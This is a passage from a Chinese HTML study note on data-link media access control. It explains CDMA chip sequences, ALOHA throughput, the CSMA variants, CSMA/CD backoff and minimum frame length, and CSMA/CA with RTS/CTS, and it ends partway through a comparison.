class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-2.453em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord">±</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<p>令向量 <code>T</code> 为（-1-1+1-1+1+1+1-1）。</p>
<p>当 <code>A</code> 站向 <code>C</code> 站发送数据 <code>1</code> 时，就发送了向量（-1-1-1+1+1-1+1+1）。</p>
<p>当 <code>B</code> 站向 <code>C</code> 站发送数据 <code>0</code> 时，就发送了向量（+1+1-1+1-1-1-1+1）。</p>
<p>两个向量到了公共信道上就进行叠加，实际上就是线性相加，得到 <code>S + T = (0 0 -2 2 0 -2 0 2)</code></p>
<p>到达 <code>C</code> 站后，进行数据分离，如果要得到来自 <code>A</code> 站的数据，<code>C</code> 站就必须知道 <code>A</code> 站的码片序列，让 <code>S</code> 与 <code>S + T</code> 进行规格化内积。根据叠加原理，其他站点的信号都在内积的结果中被过滤掉了，内积的相关项都是 <code>0</code>，而只剩下 <code>A</code> 站发送的信号。得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>∙</mo><mo stretchy="false">(</mo><mi>S</mi><mo>+</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">S \bullet (S + T) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。所以 <code>A</code> 站发出的数据是 <code>1</code>。同理，如果要得到来自 <code>B</code> 站的数据，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∙</mo><mo stretchy="false">(</mo><mi>S</mi><mo>+</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T \bullet (S + T) = -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。因此从 <code>B</code> 站发送过来的信号向量是一个反码向量，代表 <code>0</code>。</p>
<p>规格化内积是线性代数中的内容，它是在得到两个向量的内积后再除以向量的分量的个数。</p>
<p>码分多路复用技术具有频谱利用率高、抗干扰能力强、保密性强、语音质量好等优点，还可以减少投资和降低运行成本，主要用于无线通信系统，特别是移动通信系统。</p>
</li>
</ol>
<h4> 随机访问介质访问控制</h4>
<p>在随机访问协议中，不采用集中控制方式解决发送信息的次序问题，所有用户能根据自己的意愿随机地发送信息，占用信道全部速率。在总线形网络中，当有两个或多个用户同时发送信息时，就会产生帧的冲突（碰撞，即前面所说的相互干扰），导致所有冲突用户的发送均以失败告终。为了解决随机接入发生的碰撞，每个用户需要按照一定的规则反复地重传它的帧，直到该帧无碰撞地通过。这些规则就是随机访问介质访问控制协议，常用的协议有 ALOHA 协议、CSMA 协议、CSMA/CD 协议和 CSMA/CA 协议等，它们的核心思想都是：胜利者通过争用获得信道，从而获得信息的发送权。因此，随机访问介质访问控制协议又称 <strong>争用型协议。</strong></p>
<p>如果介质访问控制采用信道划分机制，那么结点之间的通信要么共享空间，要么共享时间，要么两者都共享；而如果采用随机访问控制机制，那么各结点之间的通信就可既不共享时间，也不共享空间。所以随机介质访问控制实质上是一种将广播信道转化为点到点信道的行为。</p>
<ol>
<li>
<p><strong>ALOHA 协议</strong></p>
<p>夏威夷大学早期研制的随机接入系统称为 ALOHA（Additive Link On-line HAwaii system）。ALOHA 协议分为纯 ALOHA 协议和时隙 ALOHA 协议两种。</p>
<ul>
<li>
<p><strong>纯 ALOHA 协议</strong></p>
<p>纯 ALOHA 协议的基本思想是，当网络中的任何一个站点需要发送数据时，可以不进行任何检测就发送数据。如果在一段时间内未收到确认，那么该站点就认为传输过程中发生了冲突。发送站点需要等待一段时间后再发送数据，直至发送成功。</p>
<p><strong>纯 ALOHA 协议的工作原理</strong>：每个站均自由地发送数据帧。为简化问题，不考虑由信道不良而产生的误码，并假定所有站发送的帧都是定长的，帧的长度不用比特而用发送这个帧所需的时间来表示。</p>
<p>例如：有四个站，当站 <code>1</code> 发送帧 <code>1</code> 时，其他站都未发送数据，所以站 <code>1</code> 的发送必定是成功的。但随后站 <code>2</code> 和站 <code>3</code> 发送的帧 <code>2</code> 和帧 <code>3</code> 在时间上重叠了一些（即发生了碰撞）。碰撞的结果是，碰撞双方（有时也可能是多方）所发送的数据出现了差错，因而都须进行重传。但是发生碰撞的各站并不能马上进行重传，因为这样做必然会继续发生碰撞。纯 ALOHA 系统采用的重传策略是让各站等待一段随机的时间，然后再进行重传。若再次发生碰撞，则需要再等待一段随机的时间，直到重传成功为止。</p>
<p>假设网络负载（T<sub>0</sub> 时间内所有站点发送成功的和未成功而重传的帧数）为 <code>G</code>，则纯 ALOHA 网络的吞吐量（T<sub>0</sub> 时间内成功发送的平均帧数）为 S = Ge<sup>-2G</sup>。当 G = 0.5 时，S = 0.5e<sup>-1</sup> ≈ 0.184，这是吞吐量 <code>S</code> 可能达到的极大值。可见，纯 ALOHA 网络的吞吐量很低。为了克服这一缺点，在原始的纯 ALOHA 协议的基础上进行改进，产生了时隙 ALOHA 协议。</p>
</li>
<li>
<p>时隙 ALOHA 协议</p>
<p>时隙 ALOHA 协议把所有各站在时间上同步起来，并将时间划分为一段段等长的时隙（Slot），规定只能在每个时隙开始时才能发送一个帧。从而避免了用户发送数据的随意性，减少了数据产生冲突的可能性，提高了信道的利用率。</p>
<p><strong>时隙 ALOHA 协议的工作原理</strong>：时隙的长度 T<sub>0</sub> 使得每个帧正好在一个时隙内发送完毕。每个帧在到达后，一般都要在缓存中等待一段小于 T<sub>0</sub> 的时间，然后才能发送出去。在一个时隙内有两个或两个以上的帧到达时，在下一个时隙将产生碰撞。碰撞后重传的策略与纯 ALOHA 的情况是相似的。</p>
<p>时隙 ALOHA 网络的吞吐量 <code>S</code> 与网络负载 <code>G</code> 的关系是 S = Ge<sup>-G</sup>。当 <code>G = 1</code> 时，S = e<sup>-1</sup> ≈ 0.368。这是吞吐量 <code>S</code> 可能达到的极大值。可见，时隙 ALOHA 网络比纯 ALOHA 网络的吞吐量大了 <code>1</code> 倍。</p>
</li>
</ul>
</li>
<li>
<p><strong>CSMA 协议</strong></p>
<p>时隙 ALOHA 系统的效率虽然是纯 ALOHA 系统的两倍，但每个站点都是随心所欲地发送数据的，即使其他站点正在发送也照发不误，因此发送碰撞的概率很大。</p>
<p>若每个站点在发送前都先监听一下共用信道，发现信道空闲后再发送，则就会大大降低冲突的可能，从而提高信道的利用率，载波监听多路访问（Carrier Sense Multiple Access，CSMA）协议依据的正是这一思想。CSMA 协议是在 ALOHA 协议基础上提出的一种改进协议，它与 ALOHA 协议的主要区别是多了一个 <strong>载波监听装置。</strong></p>
<p>根据监听方式和监听到信道忙后的处理方式不同，CSMA 协议分为三种：</p>
<ul>
<li>
<p><strong>1-坚持 CSMA</strong></p>
<p>1-坚持 CSMA（1-persistent CSMA）的基本思想是：一个结点要发送数据时，首先监听信道；如果信道空闲，那么立即发送数据；如果信道忙，那么等待，同时继续监听直至信道空闲；如果发生冲突，那么随机等待一段时间后，再重新开始监听信道。</p>
<p>“1-坚持” 的含义是：监听到信道忙后，继续坚持监听信道；监听到信道空闲后，发送帧的概率为 <code>1</code>，即立刻发送数据。</p>
<p>传播延迟对 1-坚持 CSMA 协议的性能影响较大。结点 <code>A</code> 开始发送数据时，结点 <code>B</code> 也正好有数据要发送，但这时结点 <code>A</code> 发出数据的信号还未到达结点 <code>B</code>，结点 <code>B</code> 监听到信道空闲，于是立即发送数据，结果必然导致冲突。即使不考虑延迟，1-坚持 CSMA 协议也可能产生冲突。例如：结点 <code>A</code> 正在发送数据时，结点 <code>B</code> 和 <code>C</code> 也准备发送数据，监听到信道忙，于是坚持监听，结果当结点 <code>A</code> 发送完毕，结点 <code>B</code> 和 <code>C</code> 就会立即发送数据，同样导致冲突。</p>
</li>
<li>
<p><strong>非坚持 CSMA</strong></p>
<p>非坚持 CSMA（Non-persistent CSMA）的基本思想是：一个结点要发送数据时，首先监听信道；如果信道空闲，那么立即发送数据；如果信道忙，那么放弃监听，等待一个随机的时间后再重复上述过程。</p>
<p>非坚持 CSMA 协议在监听到信道忙后就放弃监听，因此降低了多个结点等待信道空闲后同时发送数据导致冲突的概率，但也会增加数据在网络中的平均延迟。可见，信道利用率的提高是以增加数据在网络中的延迟时间为代价的。</p>
</li>
<li>
<p><strong>p-坚持 CSMA</strong></p>
<p>p-坚持 CSMA（p-persistent CSMA）用于时分信道，其基本思想是：一个结点要发送数据时，首先监听信道；如果信道忙，就持续监听，直至信道空闲；如果信道空闲，那么以概率 <code>p</code> 发送数据，以概率 <code>1 - p</code> 推迟到下一个时隙；如果在下一个时隙信道仍然空闲，那么仍以概率 <code>p</code> 发送数据，以概率 <code>1 - p</code> 推迟到下一个时隙；这个过程一直持续到数据发送成功或因其他结点发送数据而检测到信道忙为止，若是后者，则等待下一个时隙再重新开始监听。</p>
<p>P-坚持 CSMA 在检测到信道空闲后，以概率 <code>p</code> 发送数据，以概率 <code>1 - P</code> 推迟到下一个时隙，其目的是降低 1-坚持 CSMA 协议中多个结点检测到信道空闲后同时发送数据的冲突概率；采用坚持 “监听” 的目的是，试图克服非坚持 CSMA 协议中由于随机等待而造成的延迟时间较长的缺点。因此，p-坚持 CSMA 协议是非坚持 CSMA 协议和 1-坚持 CSMA 协议的折中方案。</p>
</li>
</ul>
<p>三种不同类型的 CSMA 协议比较如下表：aerf</p>
<table>
<thead>
<tr>
<th style="text-align:center">信道状态</th>
<th style="text-align:center">1-坚持</th>
<th style="text-align:center">非坚持</th>
<th style="text-align:center">p-坚持</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">空闲</td>
<td style="text-align:center">立即发送数据</td>
<td style="text-align:center">立即发送数据</td>
<td style="text-align:center">以概率 p 发送数据，以概率 1 - p 推迟到下一个时隙</td>
</tr>
<tr>
<td style="text-align:center">忙</td>
<td style="text-align:center">继续坚持监听</td>
<td style="text-align:center">放弃监听，等待一个随机的时间后再监听</td>
<td style="text-align:center">持续监听，直至信道空闲</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>CSMA/CD 协议</strong></p>
<p>载波监听多路访间/碰撞检测（CSMA/CD）协议是 CSMA 协议的改进方案，适用于总线形网络或半双工网络环境。对于全双工的网络，由于全双工采用两条信道，分别用来发送和接收，在任何时候，收发双方都可以发送或接收数据，不可能产生冲突，因此不需要 CSMA/CD 协议。</p>
<p><strong>载波监听是指每个站点在发送前和发送中都必须不停地检测信道</strong>，在发送前检测信道是为了获得发送权，在发送中检测信道是为了及时发现发送的数据是否发生了碰撞。站点要发送数据前先监听信道，只有信道空闲才能发送，碰撞检测（Collision Detection）就是边发送边监听，如果监听到了碰撞，则立即停止数据发送，等待一段随机时间后，重新开始尝试发送数据。</p>
<p>CSMA/CD 的工作流程可简单概括为 “先听后发，边听边发，冲突停发，随机重发”。</p>
<p>电磁波在总线上的传播速率总是有限的，因此，当某个时刻发送站检测到信道空闲时，此时信道并不一定是空闲的。设 <code>τ</code> 为单程传播时延。在 <code>t = 0</code> 时，<code>A</code> 发送数据。在 <code>t = τ - δ</code> 时，<code>A</code> 发送的数据还未到达 <code>B</code>，由于 <code>B</code> 检测到信道空闲而发送数据。经过时间 <code>δ/2</code> 后，即在 <code>t = τ - δ/2</code> 时，<code>A</code> 发送的数据和 <code>B</code> 发送的数据发生碰撞，但这时 <code>A</code> 和 <code>B</code> 都不知道。在 <code>t = τ</code> 时，<code>B</code> 检测到碰撞，于是停止发送数据。在 <code>t = 2τ - δ</code> 时，<code>A</code> 检测到碰撞，也停止发送数据。显然，CSMA/CD 中的站不可能同时进行发送和接收，因此采用 CSMA/CD 协议的以太网只能进行半双工通信。</p>
<p>站 <code>A</code> 在发送帧后至多经过时间 <code>2τ</code>（端到端传播时延的 <code>2</code> 倍）就能知道所发送的帧有没有发生碰撞（当 <code>δ → 0</code> 时）。因此把以太网端到端往返时间 <code>2τ</code> 称为 <strong>争用期</strong>（又称冲突窗口或碰撞窗口）。每个站在自己发送数据之后的一小段时间内，存在发生碰撞的可能性，只有经过争用期这段时间还未检测到碰撞时，才能确定这次发送不会发生碰撞。</p>
<p>现考虑一种情况，某站点发送一个很短的帧，但在发送完毕之前并没有检测出碰撞。假定这个帧在继续向前传播到达目的站之前和别的站发送的帧发生了碰撞，因而目的站将收到有差错的帧（当然会把它丢弃）。可是发送站却不知道发生了碰撞，因而不会重传这个帧。为了避免发生这种情况，以太网规定了一个最短帧长（争用期内可发送的数据长度）。在争用期内如果检测到碰撞，站点就会停止发送，此时已发送出去的数据一定小于最短帧长，因此凡长度小于这个最短帧长的帧都是由于冲突而异常中止的无效帧。<strong>最小帧长的计算公式为</strong>：<em>最小帧长 = 总线传播时延 × 数据传输速率 × 2</em></p>
<p>例如：以太网规定取 <code>51.2μs</code> 为争用期的长度。对于 <code>10Mb/s</code> 的以太网，在争用期内可发送 <code>512bit</code>，即 <code>64B</code>。在以太网发送数据时，如果前 <code>64B</code> 未发生冲突，那么后续数据也就不会发生冲突（表示已成功抢占信道）。换句话说，如果发生冲突，那么就一定在前 <code>64B</code>。由于一且检测到冲突就立即停止发送，因此这时发送出去的数据一定小于 <code>64B</code>。因此，以太网规定最短帧长为 <code>64B</code>，凡长度小于 <code>64B</code> 的帧都是由于冲突而异常中止的无效帧，收到这种无效帧时应立即丢弃。</p>
<p>如果只发送小于 <code>64B</code> 的帧，如 <code>40B</code> 的帧，那么需要在 MAC 子层中于数据字段的后面加入一个整数字节的填充字段，以保证以太网的 MAC 帧的长度不小于 <code>64B</code>。</p>
<p>除检测冲突外，CSMA/CD 还能从冲突中恢复。一旦发生了冲突，参与冲突的两个站点紧接着再次发送是没有意义的，如果它们这样做，那么将会导致无休止的冲突。CSMA/CD 采用截断二进制指数退避算法来解决碰撞问题。<strong>算法精髓如下：</strong></p>
<ul>
<li>确定基本退避时间，一般取两倍的总线端到端传播时延 <code>2τ</code>（即争用期）</li>
<li>定义参数 <code>k</code>，它等于重传次数，但 <code>k</code> 不超过 <code>10</code>，即 <code>k = min[重传次数, 10]</code>。当重传次数不超过 <code>10</code> 时，<code>k</code> 等于重传次数；当重传次数大于 <code>10</code> 时，<code>k</code> 就不再增大而一直等于 <code>10</code></li>
<li>从离散的整数集合 [0, 1, …, 2<sup>k-1</sup>] 中随机取出一个数 <code>r</code>，重传所需退避的时间就是 <code>r</code> 倍的基本退避时间，即 <code>2rτ</code></li>
<li>当重传达 <code>16</code> 次仍不能成功时，说明网络太拥挤，认为此帧永远无法正确发出，抛弃此并向高层报告出错</li>
</ul>
<p>例如：假设一个适配器首次试图传输一帧，当传输时，它检测到碰撞。第 <code>1</code> 次重传时，<code>k = 1</code>，随机数 <code>r</code> 从整数 <code>{0, 1}</code> 中选择，因此适配器可选的重传推迟时间是 <code>0</code> 或 <code>2τ</code>。若再次发送碰撞，则在第 <code>2</code> 次重传时，随机数 <code>r</code> 从整数 <code>{0, 1, 2, 3}</code> 中选择，因此重传推迟时间是在 <code>0, 2τ, 4τ, 6τ</code> 这四个时间中随机地选取一个。以此类推。</p>
<p>使用截断二进制指数退避算法可使重传需要推迟的平均时间随重传次数的增大而增大（这也称动态退避），因而能降低发生碰撞的概率，有利于整个系统的稳定。</p>
<p><strong>CSMA/CD 算法的归纳如下：</strong></p>
<ol>
<li><strong>准备发送</strong>：适配器从网络层获得一个分组，封装成帧，放入适配器的缓存</li>
<li><strong>检测信道</strong>：若检测到信道空闲，它就开始发送这个帧。若检测到信道忙，它就持续检测直至信道上没有信号能量，然后开始发送这个帧</li>
<li><strong>在发送过程中，适配器仍持续检测信道</strong>：这里只有两种可能：
<ul>
<li><strong>发送成功</strong>：在争用期内一直未检测到碰撞，这个帧肯定能发送成功</li>
<li><strong>发送失败</strong>：在争用期内检测到碰撞，此时立即停止发送，适配器执行指数退避算法，等待一段随机时间后返回到步骤二。若重传 <code>16</code> 次仍不能成功，则停止重传并向上报错</li>
</ul>
</li>
</ol>
</li>
<li>
<p><strong>CSMA/CA 协议</strong></p>
<p>CSMA/CD 协议已成功应用于使用有线连接的局域网，但在无线局域网环境下，却不能简单地搬用 CSMA/CD 协议，特别是碰撞检测部分。主要有两个原因：</p>
<ul>
<li>接收信号的强度往往会远小于发送信号的强度，且在无线介质上信号强度的动态变化范围很大，因此若要实现碰撞检测，则硬件上的花费就会过大</li>
<li>在无线通信中，并非所有的站点都能够听见对方，即存在 “隐蔽站” 问题</li>
</ul>
<p>为此，802.11 标准定义了广泛应用于无线局域网的 CSMA/CA 协议，它对 CSMA/CD 协议进行了修改，把碰撞检测改为 <strong>碰撞避免（Collision Avoidance，CA）</strong>。“碰撞避免” 并不是指协议可以完全避免碰撞，而是指协议的设计要尽量降低碰撞发生的概率。由于 802.11 无线局域网不使用碰撞检测，一旦站点开始发送一个帧，就会完全地发送该帧，但碰撞存在时仍然发送整个数据帧（尤其是长数据帧）会严重降低网络的效率，因此要采用碰撞避免技术降低碰撞的可能性。</p>
<p>由于无线信道的通信质量远不如有线信道，802.11 使用链路层确认/重传（ARQ）方案，即站点每通过无线局域网发送完一帧，就要在收到对方的确认帧后才能继续发送下一帧。</p>
<p>为了尽量避免碰撞，802.11 规定，所有的站完成发送后，必须再等待一段很短的时间（继续监听）才能发送下一帧。这段时间称为 <strong>帧间间隔（Inter Frame Space，IFS）</strong>。帧间间隔的长短取决于该站要发送的帧的类型。<strong>802.11 使用了下列三种 IFS：</strong></p>
<ul>
<li><strong>SIFS（短 IFS）</strong>：最短的 IFS，用来分隔属于一次对话的各帧，使用 SIFS 的帧类型有 ACK 帧、CTS 帧、分片后的数据帧，以及所有回答 AP 探询的帧等</li>
<li><strong>PIFS（点协调 IFS）</strong>：中等长度的 IFS，在 PCF 操作中使用</li>
<li><strong>DIFS（分布式协调 IFS）</strong>：最长的 IFS，用于异步帧竞争访问的时延</li>
</ul>
<p>CSMA/CA 的退避算法和 CSMA/CD 的稍有不同。信道从忙态变为空闲态时，任何一个站要发送数据帧，不仅都要等待一个时间间隔，而且要进入争用窗口，计算随机退避时间以便再次试图接入信道，因此降低了碰撞发生的概率。当且仅当检测到信道空闲且这个数据帧是要发送的第一个数据帧时，才不使用退避算法。其他所有情况都必须使用退避算法，具体为：在发送第一个帧前检测到信道忙；每次重传；每次成功发送后要发送下一帧。</p>
<p><strong>CSMA/CA 算法的归纳如下：</strong></p>
<ol>
<li>若站点最初有数据要发送（而不是发送不成功再进行重传），且检测到信道空闲，在等待时间 DIFS 后，就发送整个数据帧</li>
<li>否则，站点执行 CSMA/CA 退避算法，选取一个随机回退值。一旦检测到信道忙，退避计时器就保持不变。只要信道空闲，退避计时器就进行倒计时</li>
<li>当退避计时器减到 <code>0</code> 时（这时信道只可能是空闲的），站点就发送整个帧并等待确认</li>
<li>发送站若收到确认，就知道已发送的帧被目的站正确接收。这时如果要发送第二帧，就要从步骤二开始，执行 CSMA/CA 退避算法，随机选定一段退避时间</li>
</ol>
<p>若发送站在规定时间（由重传计时器控制）内没有收到确认帧 ACK，就必须重传该帧，再次使用 CSMA/CA 协议争用该信道，直到收到确认，或经过若干次重传失败后放弃发送。</p>
<p><strong>处理隐蔽站问题：RTS 和 CTS</strong></p>
<p>例如：两个站点 <code>A</code> 和 <code>B</code>，站 <code>A</code> 和 <code>B</code> 都在 AP 的覆盖范围内，但 <code>A</code> 和 <code>B</code> 相距较远，彼此都听不见对方。当 <code>A</code> 和 <code>B</code> 检测到信道空闲时，都向 AP 发送数据，导致碰撞的发生，这就是隐蔽站问题。</p>
<p>为了避免该问题，802.11 允许发送站对信道进行预约。源站要发送数据帧之前先广播一个很短的 <strong>请求发送 RTS（Request To Send）</strong> 控制帧，它包括源地址、目的地址和这次通信（含相应的确认帧）所持续的时间，该帧能被其范围内包括 AP 在内的所有站点听到。若信道空闲，则 AP 广播一个 <strong>允许发送 CTS（Clear To Send）</strong> 控制帧它包括这次通信所需的持续时间（从 RTS 复制），该帧也能被其范围内包括 <code>A</code> 和 <code>B</code> 在内的所有站点听到。<code>B</code> 和其他站听到 CTS 后，在 CTS 帧中指明的时间内将抑制发送。CTS 帧有两个目的：一给源站明确的发送许可；二指示其他站点在预约期内不要发送。</p>
<p>使用 RTS 和 CTS 会使网络的通信效率有所下降，但这两种帧都很短，与数据帧相比开销不算大。相反，若不使用这种控制帧，一且发生碰撞而导致数据帧重发，则浪费的时间更多。信道预约不是强制性规定，各站可以自已决定使用或不使用信道预约。只有当数据帧长度超过某一数值时，使用 RTS 和 CTS 帧才比较有利。</p>
<p><strong>CSMA/CD 与 CSMA/CA 主要有如下区别：</strong></p>
<ul>
